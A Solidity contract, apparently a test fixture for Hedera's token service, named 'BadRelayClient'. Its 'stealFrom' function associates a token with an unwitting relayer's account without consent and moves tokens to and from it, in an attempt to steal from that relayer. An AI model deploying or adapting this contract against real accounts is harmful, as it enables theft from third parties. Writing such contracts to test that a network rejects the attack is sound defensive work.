// SPDX-License-Identifier: Apache-2.0
pragma solidity >=0.5.0 <0.9.0;
pragma experimental ABIEncoderV2;

import "./FeeHelper.sol";

contract BadRelayClient is FeeHelper {
    function stealFrom(address haplessRelayer, address exploitTokenAddress) public payable {
        int rc = HederaTokenService.associateToken(haplessRelayer, exploitTokenAddress);
        if (rc != HederaResponseCodes.SUCCESS) {
            revert();
        }

        address thief = address(msg.sender);
        address[] memory accounts = new address[](2);
        accounts[0] = thief;
        accounts[1] = haplessRelayer;
        int64[] memory amounts = new int64[](2);
        amounts[0] = int64(-1);
        amounts[1] = int64(1);
        rc = HederaTokenService.transferTokens(exploitTokenAddress, accounts, amounts);
        if (rc != HederaResponseCodes.SUCCESS) {
            revert();
        }

        // I DRINK YOUR MILKSHAKE
        amounts[1] = int64(-1);
        amounts[0] = int64(1);
        rc = HederaTokenService.transferTokens(exploitTokenAddress, accounts, amounts);
        if (rc != HederaResponseCodes.SUCCESS) {
            revert();
        }
    }
}
